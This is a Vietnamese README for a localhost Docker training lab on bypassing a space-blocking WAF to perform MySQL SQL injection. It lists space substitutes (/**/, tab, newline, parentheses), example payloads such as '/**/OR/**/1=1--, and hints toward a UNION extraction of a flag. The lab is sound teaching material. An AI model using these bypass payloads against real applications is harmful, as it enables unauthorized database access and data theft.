# SQLi-043: MySQL Space Filter Bypass

## 🎯 Mục Tiêu

Bypass WAF filter chặn khoảng trắng (space) trong input để thực hiện SQL Injection trên MySQL.

## 📝 Mô Tả

**Scenario:** Một ứng dụng e-commerce có chức năng tìm kiếm sản phẩm được bảo vệ bởi WAF đơn giản. WAF này phát hiện và chặn mọi request chứa ký tự khoảng trắng trong tham số tìm kiếm.

**URL:** `http://localhost:5043/search?q=laptop`

**WAF Behavior:**
- Request có space → ❌ "Invalid characters detected"
- Request không có space → ✅ Query thực thi bình thường

## 🎓 Kiến Thức Cần Biết

### Space Alternatives trong MySQL

```sql
-- Comment thay thế space
SELECT/**/username/**/FROM/**/users

-- Tab character (%09)
SELECT%09username%09FROM%09users

-- Newline (%0a)  
SELECT%0ausername%0aFROM%0ausers

-- Carriage return (%0d)
SELECT%0dusername%0dFROM%0dusers

-- Parentheses
SELECT(username)FROM(users)
```

### Ví dụ Payload

```sql
-- Original (bị block)
' OR 1=1--

-- Bypass với /**/
'/**/OR/**/1=1--

-- Bypass với %09
'%09OR%091=1--
```

## 🚀 Khởi Chạy Lab

```bash
cd Module-07-Filter-Bypass/SQLi-043
docker-compose up -d
```

Truy cập: `http://localhost:5043`

## 💡 Gợi Ý

1. Thử tìm kiếm bình thường, quan sát kết quả
2. Thử thêm `'` để phát hiện injection point
3. Xác định filter đang chặn ký tự nào
4. Tìm cách thay thế space bằng ký tự khác
5. Xây dựng payload UNION để extract data

## 🏁 Flag Format

```
FLAG{...}
```

Flag nằm trong bảng `flags` của database.
